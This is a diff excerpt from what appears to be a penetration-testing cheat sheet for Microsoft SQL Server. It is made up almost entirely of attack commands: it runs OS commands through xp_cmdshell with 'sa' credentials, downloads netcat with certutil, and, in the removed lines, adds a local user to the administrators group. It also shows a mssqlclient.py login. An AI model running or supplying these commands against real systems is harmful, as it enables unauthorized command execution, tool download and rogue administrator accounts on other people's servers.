@@ -15,12 +15,7 @@ Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password
 Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'ipconfig'"
 Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'certutil.exe -urlcache -split -f https://github.com/diegocr/netcat/raw/master/nc.exe'"
 Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'net localgroup administrators'"
-#$command = "net localgroup administrators /add pornstar"
-#Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell '$command'"
-#Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'net localgroup administrators /add pornstar'"
-Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'net user NyaMeeEain 123456@aA /add'"
-Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'net localgroup administrators /add NyaMeeEain'"
-net localgroup administrators /add pornstar
+
 ```
 ```
 python mssqlclient.py sa:123456@192.168.100.120
